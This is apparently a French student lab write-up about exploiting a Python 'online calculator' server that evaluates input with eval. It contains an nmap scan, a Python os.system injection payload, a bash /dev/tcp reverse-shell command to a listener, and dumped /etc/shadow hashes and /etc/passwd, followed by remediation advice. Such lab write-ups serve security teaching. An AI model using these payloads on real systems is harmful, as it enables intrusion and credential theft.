# TP5 : Exploit, pwn, fix

## Sommaire

  - [1. Reconnaissance](#1-reconnaissance)
  - [2. Exploit](#2-exploit)
  - [3. Reverse shell](#3-reverse-shell)
  - [4. Bonus : DOS](#4-bonus--dos)
  - [II. Remédiation](#ii-remédiation)

## 1. Reconnaissance

🌞 **Déterminer**

Le client essaye de se connecter à l'adresse IP 10.1.2.12 et au port 13337.

Sans avoir accès au code source, on pouvait également voir ce qu'il se passe en lançant le client et en regardant les communications avec Wireshark.

🌞 **Scanner le réseau**

[La petit capture Wireshark](./tp5_nmap.pcapng)

Et le petit nmap :
```
[axel@fedora ~]$ sudo nmap -sS 10.33.64.0/20 -p 13337
Nmap scan report for 10.33.66.165
Host is up (0.012s latency).

PORT      STATE SERVICE
13337/tcp open  unknown
MAC Address: 56:4C:81:26:BF:C8 (Unknown)

Nmap scan report for 10.33.70.40
Host is up (0.028s latency).

PORT      STATE SERVICE
13337/tcp open  unknown
MAC Address: E4:B3:18:48:36:68 (Intel Corporate)

Nmap scan report for 10.33.76.195
Host is up (0.0090s latency).

PORT      STATE SERVICE
13337/tcp open  unknown
MAC Address: 82:30:BF:B6:57:2F (Unknown)

Nmap scan report for 10.33.76.217
Host is up (0.0068s latency).

PORT      STATE SERVICE
13337/tcp open  unknown
MAC Address: 2C:6D:C1:5E:41:6A (Intel Corporate)

Nmap done: 4096 IP addresses (865 hosts up) scanned in 227.73 seconds
```

🌞 **Connectez-vous au serveur**

On met une des IP trouvées par nmap à la place de l'ancienne IP pour que ça marche.

Il s'agit d'une calculatrice "en ligne".

## 2. Exploit

🌞 **Injecter du code serveur**

A mettre dans la zone d'input pour que le serveur me ping.

Il faut aussi modifier le code côté client pour retirer la regex.
```
__import__('os').system('ping -c 1 10.33.79.35')
```

## 3. Reverse shell

🌞 **Obtenez un reverse shell sur le serveur**


Côté *hacker* :
```
nc -lvnp 9001
```
Ce qu'il faut mettre dans la zone d'input :
```
__import__('os').system('sh -i >& /dev/tcp/10.33.79.35/9001 0>&1')
```
Et **POP** un shell.

🌞 **Pwn**

etc/shadow :
```
cat /etc/shadow
root:$6$Ac2Zned208vSDVSn$wKuS7q/pIYPo90yin8zl6Ocxd/liQd4aCTnzQEwsTQ2feosGAovhMqxFR.oladVr3G8UbXf2/u.OzeDfWM4aq.::0:99999:7:::
bin:*:19469:0:99999:7:::
daemon:*:19469:0:99999:7:::
adm:*:19469:0:99999:7:::
lp:*:19469:0:99999:7:::
sync:*:19469:0:99999:7:::
shutdown:*:19469:0:99999:7:::
halt:*:19469:0:99999:7:::
mail:*:19469:0:99999:7:::
operator:*:19469:0:99999:7:::
games:*:19469:0:99999:7:::
ftp:*:19469:0:99999:7:::
nobody:*:19469:0:99999:7:::
systemd-coredump:!!:19621::::::
dbus:!!:19621::::::
tss:!!:19621::::::
sssd:!!:19621::::::
sshd:!!:19621::::::
systemd-oom:!*:19621::::::
it4:$6$bV62paDqH/ZQSVFb$jiBgcgpkuzmmoZSvvLPwpd4gjwvnKQEWTE119tMNTnICtMcJ6dyPcDCVaTur8j5UQFuxAAM6eTimGdr97Nagh1::0:99999:7:::
```
etc/passwd :
```
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
systemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
tss:x:59:59:Account used for TPM access:/dev/null:/sbin/nologin
sssd:x:998:995:User for sssd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/sbin/nologin
systemd-oom:x:993:993:systemd Userspace OOM Killer:/:/usr/sbin/nologin
it4:x:1000:1000:it4:/home/it4:/bin/bash
```

[ICI](./serveur.py) pour le code du serveur.

Il y a seulement le serveur python et ssh :
```
ss -tupnl
Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess                             
tcp   LISTEN 2      1          10.0.3.15:13337      0.0.0.0:*    users:(("python3.9",pid=2312,fd=4))
tcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*    users:(("sshd",pid=699,fd=3))      
tcp   LISTEN 0      128             [::]:22            [::]:*    users:(("sshd",pid=699,fd=4))
```

## II. Remédiation

🌞 **Proposer une remédiation dév**

J'ai modifié le code pour ne plus utiliser la fonction eval et vérifier l'input utilisateur.

Voici le [code](./serveur_modified.py)

Ici il y a une regex qui cherche une expression regulière (comme la version client initialement) et j'ai fais une mini calculatrice pour remplacer eval.
On gagne donc en sécurité mais perds la possibilité d'ajouter d'autres opérations facilement.

Une autre version du [code](./serveur_modifiedv2.py)

Qui lui re utilise la fonction eval.

Ici il y a seulement la même regex.

🌞 **Proposer une remédiation système**

Le user qui fait tourner le serveur est root.
```
whoami
root
```
Il faudrait créer un user spécial pour le serveur qui a uniquement les droits de lancer ce script et écrire dans le fichier de log.

Aussi ça pourrait être sympa de faire tourner tout ça dans un docker container.

[Ici](./Dockerfile) un exemple de Dockerfile.

[Et ici](./docker-compose.yml) un exemple de docker compose.